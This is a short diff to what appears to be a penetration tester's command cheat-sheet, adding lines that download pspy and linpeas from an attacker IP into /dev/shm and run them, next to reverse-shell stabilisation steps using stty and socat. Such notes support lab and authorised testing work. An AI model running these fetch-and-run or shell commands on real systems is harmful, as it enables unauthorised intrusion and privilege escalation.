@@ -11,6 +11,9 @@ stty raw -echo ; fg ; reset
 stty columns 200 rows 200
 stty columns 150 rows 150
 
+wget http://192.168.45.238:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;/dev/shm/pspy
+wget http://192.168.45.238:8000/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/linpeas.sh
+
 // Pimp out linux shell
 which socat
 socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
